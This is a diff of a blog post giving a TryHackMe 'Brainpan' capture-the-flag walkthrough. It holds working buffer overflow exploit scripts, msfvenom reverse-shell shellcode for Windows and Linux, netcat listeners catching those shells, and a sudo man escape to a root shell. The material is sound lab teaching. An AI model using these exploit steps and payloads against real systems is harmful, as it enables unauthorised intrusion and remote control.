@@ -25,9 +25,7 @@ og_image: "/assets/img/brainpan1/logo.png"
 <br/>
 Welcome to my Brainpan walkthrough.  This is the TryHackMe version.  First step to perform is running nmap to know what ports are open.
 
-
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ nmap -sV -sC -A -O -oN nmap 10.10.157.16
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 13:33 AEDT
@@ -47,16 +45,18 @@ PORT      STATE SERVICE VERSION
 10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
 |_http-server-header: SimpleHTTP/0.6 Python/2.7.3
 
-<snip>
-```
-{% endraw %}
+<spin>
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br/>
 Reviewing the results, there are only two ports open.  Using nc connect to port 9999.  It prompts for a password and then gives an access denied.
 
-
-{% raw %}
-```bash
+{% capture ncconnect %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ nc 10.10.157.16 9999                        
 _|                            _|                                        
@@ -72,14 +72,17 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
 
                           >> dfsf
                           ACCESS DENIED
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=ncconnect %}
 
 <br/>
 Navigating to the webserver, there is only a png file there.  So, run gobuster and review the results.  Notice the /bin folder.
 
-{% raw %}
-```bash
+{% capture gobustermain %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ gobuster dir -u http://10.10.157.16:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster      
 ===============================================================
@@ -103,11 +106,14 @@ Progress: 2855 / 220561 (1.29%)
 ===============================================================
 Finished
 ===============================================================
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=gobustermain %}
 
 <br/>
-
 Navigate to the bin folder and notice the brainpan.exe.  
 
 <div class="row justify-content-sm-center">
@@ -119,8 +125,7 @@ Navigate to the bin folder and notice the brainpan.exe.
 <br/>
 Feel free to wget and download it.
 
-{% raw %}
-```bash
+{% capture downloadbinary %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ wget http://10.10.157.16:10000/bin/brainpan.exe                         
 --2025-01-03 13:42:17--  http://10.10.157.16:10000/bin/brainpan.exe
@@ -132,19 +137,26 @@ Saving to: ‘brainpan.exe’
 brainpan.exe                                               100%[========================================================================================================================================>]  20.69K  74.7KB/s    in 0.3s    
 
 2025-01-03 13:42:18 (74.7 KB/s) - ‘brainpan.exe’ saved [21190/21190]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadbinary %}
 
 <br/>
 Spin up a python web server so we can transfer it to another windows machine for testing.
 
-{% raw %}
-```bash
+{% capture pywebserver %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ python3 -m 'http.server'                                         
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=pywebserver %}
 
 <br/>
 Transfer the executable to a Windows machine running Windbg with the narly extension installed.
@@ -185,8 +197,7 @@ Check the IP address of the Windows machine.
 <br />
 Create a python that creates a socket connection with the service and sends a passwords.  Duplicates "normal" behaviour.
 
-{% raw %}
-```python
+{% capture zeroone %}
 import socket
 
 ip = '10.0.0.11'
@@ -201,17 +212,17 @@ s.send(b'password\r\n')
 print(s.recv(1024))
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x01.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x01.py"
+   content=zeroone %}
 
 <br />
 Update the python code to fuzz the password field with an ever-increasing payload to determine the breaking point.
 
-{% raw %}
-```python
+{% capture zerotwo %}
 import socket
 
 ip = '10.0.0.11'
@@ -233,11 +244,12 @@ for inputBuffer in buffers:
     s.sendall(inputBuffer + b'\r\n')
 
     s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x02.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x02.py"
+   content=zerotwo %}
 
 <br />
 Check the run to see the number of characters that hanged the program.
@@ -271,9 +283,8 @@ Reset the executable and set it to go again.
 <br />
 Update the python code to hard code the buffer size and increase the size to fit the payload.
 
-{% raw %}
-```python
-mport socket
+{% capture zerothree %}
+import socket
 
 ip = '10.0.0.11'
 port = 9999
@@ -289,12 +300,12 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
+{% endcapture %}
 
-```
-{% endraw %}
-<div class="caption">
-    brain_0x03.py
-</div>
+{% include terminal.html
+   language="python"
+   title="brain_0x03.py"
+   content=zerothree %}
 
 <br />
 Run the code again, check eip, ensure the it is still filled with 41s.  Sometime, when the buffer size is changed, it changes the program execution.
@@ -317,19 +328,21 @@ Check the ESP register to ensure that the A character overflows into ESP.
 <br />
 Use msf-pattern_create to generate a unique pattern to help assist in determining the offset of the EIP register.
 
-{% raw %}
-```bash
+{% capture genpattern %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ msf-pattern_create -l 1100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=genpattern %}
 
 <br />
 Update the python code with the pattern that was just generated.
 
-{% raw %}
-```python
+{% capture zerofour %}
 import socket
 
 ip = '10.0.0.11'
@@ -347,11 +360,12 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x04.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x04.py"
+   content=zerofour %}
 
 <br />
 Execute the code, check the EIP register, and note the value that is located there.
@@ -365,20 +379,21 @@ Execute the code, check the EIP register, and note the value that is located the
 <br />
 Use msf-pattern_offset to determine the exact offset value of the EIP register.
 
-{% raw %}
-```bash
+{% capture patternoffset %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ msf-pattern_offset -l 1100 -q 35724134
 [*] Exact match at offset 524
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=patternoffset %}
 
 <br />
 Update the code to split the buffer string into three separate parts.  The first part will be As up until the offset, Bs for 4, and Cs to pad out the rest of the buffer size.
 
-{% raw %}
-```python
+{% capture zerofive %}
 import socket
 
 ip = '10.0.0.11'
@@ -397,11 +412,12 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x05.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x05.py"
+   content=zerofive %}
 
 <br />
 Run the code again.  Check the EIP register and ensure that our 42s are in the EIP register.
@@ -426,8 +442,7 @@ Check the ESP and the four bytes prior.  The four prior bytes should be 42s from
 <br />
 Time to determine the bad characters.  Update the code with all of the bad characters except 00, the null byte.  The null byte is overwhelmingly often a bad character.
 
-{% raw %}
-```python
+{% capture badchars %}
 import socket
 
 ip = '10.0.0.11'
@@ -468,11 +483,12 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x06.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x06.py"
+   content=badchars %}
 
 <br />
 Run the code.  Check the ESP register and check the characters in the payload.  All the characters from the hex list <b>should</b> be in the ESP.  If there is any drop off, remove that character, send the payload again, and repeat until all the characters appear in ESP.
@@ -486,8 +502,7 @@ Run the code.  Check the ESP register and check the characters in the payload.  
 <br />
 Update the code to import pack and give a space for the payload.
 
-{% raw %}
-```python
+{% capture zeroseven %}
 import socket
 from struct import pack
 
@@ -514,11 +529,12 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x07.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x07.py"
+   content=zeroseven %}
 
 <br />
 In Windbg, load the narly extension.
@@ -541,14 +557,17 @@ Run the !nmod to load all of the various modules and their associated protection
 <br />
 Use msf-nasm_shell to determine the hexadecimal opcodes for the jmp esp assembly command.
 
-{% raw %}
-```bash
+{% capture nasmshell %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ msf-nasm_shell                        
 nasm > jmp esp
 00000000  FFE4              jmp esp
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nasmshell %}
 
 <br />
 Search in Windbg for a jmp esp memory address.
@@ -562,8 +581,7 @@ Search in Windbg for a jmp esp memory address.
 <br />
 Update the python script with the address of jmp.
 
-{% raw %}
-```python
+{% capture zeroeight %}
 import socket
 from struct import pack
 
@@ -590,11 +608,12 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x08.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x08.py"
+   content=zeroeight %}
 
 <br />
 Set up a breakpoint in Windbg at the jmp esp address.
@@ -626,8 +645,7 @@ Step the code one more time and it should lead into the esp and the Ds payload t
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture genpayload %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.12 LPORT=443 ExitFunc=thread -b "\x00" -f python -v payload
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -671,14 +689,17 @@ payload += b"\xf6\x28\xe8\x91\x37\xbd\xfc\xea\x25\x5d\x02"
 payload += b"\x21\xee\x7d\xe1\xe3\x1b\x16\xbc\x66\xa6\x7b"
 payload += b"\x3f\x5d\xe5\x85\xbc\x57\x96\x71\xdc\x12\x93"
 payload += b"\x3e\x5a\xcf\xe9\x2f\x0f\xef\x5e\x4f\x1a"
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="Bash"
+   content=genpayload %}
 
 <br />
 Update the code with the payload that was just generated.  Also use a nopsled to lead into the payload.
 
-{% raw %}
-```python
+{% capture zeronine %}
 import socket
 from struct import pack
 
@@ -736,49 +757,63 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x09.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=zeronine %}
 
 <br />
 Start a netcat listener that listens on port 443.
 
-{% raw %}
-```bash
+{% capture startfootlistener %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ sudo nc -nlvp 443   
 [sudo] password for sec: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startfootlistener %}
 
 <br />
 Run the code and check the listener to see the shell.
 
-{% raw %}
-```
+{% capture catchfootshell %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ sudo nc -nlvp 443   
 [sudo] password for sec: 
 listening on [any] 443 ...
 connect to [10.0.0.12] from (UNKNOWN) [10.0.0.11] 49682
 
+{% endcapture %}
+
+{% capture cmdshell %}
 Microsoft Windows [Version 10.0.19045.5247]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files (x86)\Windows Kits\10\Debuggers>whoami
 whoami
 desktop-8pbgp5f\win
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchfootshell %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=cmdshell %}
 
 <br />
 Double-check the nmap notice that operating system is likely to be linux.
 
-{% raw %}
-```bash
+{% capture dblchknmap %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ nmap -sV -sC -A -O -oN nmap 10.10.157.16
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 13:33 AEDT
@@ -790,15 +825,17 @@ No exact OS matches for host (test conditions non-ideal).
 Network Distance: 4 hops
 
 <snip>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=dblchknmap %}
 
 <br />
 Generate a new msfvenom payload for Linux.
 
-{% raw %}
-```bash
+{% capture genlinuxpayload %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.4.118.138 LPORT=443 ExitFunc=thread -b "\x00" -f python -v payload
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -819,14 +856,17 @@ payload += b"\x4c\xc9\x6c\xb6\x51\xb1\xf8\x57\xe1\xa3\xaa"
 payload += b"\xc6\x52\x9f\x48\x60\xb5\x12\xce\x20\x5d\xc3"
 payload += b"\xe0\xb7\xf5\x73\xd0\x18\x67\xed\xa7\x84\x35"
 payload += b"\xbe\x3e\xab\x09\x4b\x8c\xac"
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=genlinuxpayload %}
 
 <br />
 Update the code with the new payload and update the IP address to point to the THM IP.
 
-{% raw %}
-```python
+{% capture zeroa %}
 import socket
 from struct import pack
 
@@ -861,52 +901,61 @@ print('[*] Sending: {size}\n'.format(size=len(inputBuffer)))
 s.sendall(inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
-<div class="caption">
-    brain_0x0a.py
-</div>
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="brain_0x0a.py"
+   content=zeroa %}
 
 <br />
 Kill the other listener if it is still running with ctrl + c.  Start a new listener on port 443.
 
-{% raw %}
-```bash
+{% capture startnewlistener %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startnewlistener %}
 
 <br />
 Run the code, check the listener, and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchnewshell %}
 ┌──(sec㉿kali)-[~/Documents/thm/brainpan]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.4.118.138] from (UNKNOWN) [10.10.249.157] 54657
 whoami
 puck
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchnewshell %}
 
 <br />
 Upgrade the shell by spawning another shell with python.
 
-{% raw %}
-```bash
+{% capture improveshell %}
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 puck@brainpan:/home/puck$
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=improveshell %}
 
 <br />
 Run sudo -l to see a list of all of the command the user is permitted to use as root.
 
-{% raw %}
-```bash
+{% capture sudol %}
 puck@brainpan:/home/puck$ sudo -l
 sudo -l
 Matching Defaults entries for puck on this host:
@@ -915,14 +964,17 @@ Matching Defaults entries for puck on this host:
 
 User puck may run the following commands on this host:
     (root) NOPASSWD: /home/anansi/bin/anansi_util
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=sudol %}
 
 <br />
 Run the anansi_util program that was discovered.
 
-{% raw %}
-```bash
+{% capture runanansi %}
 puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util    
 sudo /home/anansi/bin/anansi_util
 Usage: /home/anansi/bin/anansi_util [action]
@@ -930,14 +982,17 @@ Where [action] is one of:
   - network
   - proclist
   - manual [command]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runanansi %}
 
 <br />
 Run the anansi_util with the manual option to see what it does.
 
-{% raw %}
-```bash
+{% capture checkman %}
 puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
 sudo /home/anansi/bin/anansi_util manual ls
 No manual entry for manual
@@ -967,8 +1022,12 @@ DESCRIPTION
 
        --author
  Manual page ls(1) line 1 (press h for help or q to quit)q
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=checkman %}
 
 <br />
 Now, that it is known that it calls the man command, lookup man on the gtfobins.
@@ -983,8 +1042,7 @@ Now, that it is known that it calls the man command, lookup man on the gtfobins.
 <br />
 Use the command again with sudo to drop into the manual.  Then, use !/bin/sh to drop into a root shell.
 
-{% raw %}
-```bash
+{% capture getrootshell %}
 puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man
 sudo /home/anansi/bin/anansi_util manual man
 No manual entry for manual
@@ -1018,8 +1076,12 @@ DESCRIPTION
 # whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=getrootshell %}
 
 <br />
 Now with root access, nick the root trophy.
